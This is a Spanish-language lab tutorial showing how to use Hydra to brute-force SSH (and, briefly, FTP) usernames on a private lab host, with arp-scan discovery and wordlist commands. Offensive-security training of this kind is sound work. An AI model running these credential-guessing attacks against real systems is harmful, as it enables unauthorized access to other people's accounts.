# Uso de Hydra - Parte 2 – Ataques de Fuerza Bruta a Contraseñas (SSH y FTP)

En este caso sabremos la contraseña pero no el usuario.

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%2061.png)

- Vamos a suponer que no se cual es el usuario pero si la **contraseña** que es **alexis.**
    
    **NOTA:** Mirar la sección Notas el punto numero 2 y el 3 para los diccionarios de usuarios.
    
    ```bash
    hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://10.0.3.8
    ```
    
    Usaremos el diccionario **unix_users.txt** para encontrar usuarios.
    
    ![image.png](./imagenes/image%2062.png)
    
    **No a encontrado el usuario 😲. Si pasa esto debemos seguir intentándolo con otros diccionarios.**
    
    - En este caso al ser una practica de concepto vamos a añadir a mano el nombre del usuario (que conocemos del ejercicio anterior  **Parte 1)** en el diccionario.
        
        ```bash
        sudo nano /usr/share/wordlists/metasploit/unix_users.txt
        ```
        
        ![image.png](./imagenes/image%2063.png)
        

- Vamos a volver a repetir el ataque con hydra.
    
    ```bash
    hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://10.0.3.8
    ```
    
    ![image.png](./imagenes/image%2064.png)
    

- Esta vez vamos ha hacer exactamente igual pero **atacando al protocolo FTP**.
    
    ![image.png](./imagenes/image%2065.png)